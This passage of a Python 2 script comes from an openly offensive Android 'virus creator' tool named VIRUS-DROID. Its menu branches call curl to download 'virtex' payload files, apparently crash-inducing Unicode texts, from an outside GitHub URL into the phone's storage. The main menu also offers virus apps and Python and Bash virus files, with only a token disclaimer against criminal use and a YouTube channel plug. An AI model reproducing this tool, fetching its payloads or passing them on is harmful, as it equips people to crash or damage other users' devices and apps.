                                            slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                            print ''
                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                            if b == '1' in b:
                                                virtex()
                                            if b == '2' in b:
                                                exit()
                                    else:
                                        if piltex == '9' in piltex:
                                            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                            if a == '1' in a:
                                                slowprint('Please wait for a few minutes ...')
                                                os.system('curl -o /sdcard/V-Coly.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V9.txt')
                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                print ''
                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                if b == '1' in b:
                                                    virtex()
                                                if b == '2' in b:
                                                    exit()
                                            if a == '2' in a:
                                                slowprint('Please wait for a few minutes ...')
                                                os.system('curl -o /$HOME/V-Coly.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V9.txt')
                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                print ''
                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                if b == '1' in b:
                                                    virtex()
                                                if b == '2' in b:
                                                    exit()
                                        else:
                                            if piltex == '10' in piltex:
                                                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                if a == '1' in a:
                                                    slowprint('Please wait for a few minutes ...')
                                                    os.system('curl -o /sdcard/V-IDN-GANAS.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V20.txt')
                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                    print ''
                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                    if b == '1' in b:
                                                        virtex()
                                                    if b == '2' in b:
                                                        exit()
                                                if a == '2' in a:
                                                    slowprint('Please wait for a few minutes ...')
                                                    os.system('curl -o /$HOME/V-IDN-GANAS.txt https://raw.githubusercontent.com/muhammadfathul/vir/master/V20.txt')
                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                    print ''
                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                    if b == '1' in b:
                                                        virtex()
                                                    if b == '2' in b:
                                                        exit()
                                            else:
                                                if piltex == '99' in piltex:
                                                    main()
                                                else:
                                                    virtex()


def main():
    os.system('clear')
    slowprint(logo)
    slowprint('WELCOME TO ANDROID VIRUS CREATOR !')
    slowprint('Dont use this tools for Criminal Actions')
    slowprint('For support me please subscribe youtube channel : SAYDOG')
    print ''
    print '\x1b[1;33m 1.\x1b[00m Virus App'
    print '\x1b[1;33m 2.\x1b[00m Virus File Python'
    print '\x1b[1;33m 3.\x1b[00m Virus File Bash/Shell'
    print '\x1b[1;33m 4.\x1b[00m Virtext Unicode'
    print '\x1b[1;33m 5.\x1b[00m Subscribe Channel \x1b[41mSAYDOG\x1b[00m'
    print '\x1b[1;91m 0. Exit\x1b[00m'
    print ''
    iqbalmh18 = raw_input('Virus\xc2\xaeDroid > ')
    if iqbalmh18 == '':
        main()
    else:
        if iqbalmh18 == '1':
            app()
        else:
            if iqbalmh18 == '2':
                python()
            else:
                if iqbalmh18 == '3':
                    bash()
                else:
                    if iqbalmh18 == '4':
                        virtex()
                    else:
                        if iqbalmh18 == '5':
                            os.system('xdg-open https://www.youtube.com/channel/UCDoJC1ZJ_SmYKZZLD8PBmcQ')
                            main()
                        else:
                            if iqbalmh18 == '0':
                                exit()
                            else:
                                main()


main()
